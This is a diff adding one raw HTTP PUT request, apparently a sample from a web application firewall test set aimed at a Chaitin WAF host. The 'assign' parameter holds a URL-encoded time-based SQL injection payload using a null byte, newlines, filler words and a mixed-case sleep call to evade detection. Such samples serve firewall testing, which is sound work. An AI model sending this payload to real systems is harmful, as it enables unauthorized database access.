@@ -1,0 +1,13 @@
+PUT /module?anomaly=module&assign=%22%29%29%0AOR%00--%20paginationkeyparcspacedafternoongradcolumnshiddenpayloadcompiletriggerpath%20%0AsleEP%285%29%3D%22 HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
+Cookie: pong=explicit; roll%20off=arbitrary; SESSIONID=234ce583886f37bd04d98bed8d6634a6bbd57b7d9a3c6fc85a925e8ec6387e4606f0bee2436394a4774c50bab28a482d
+
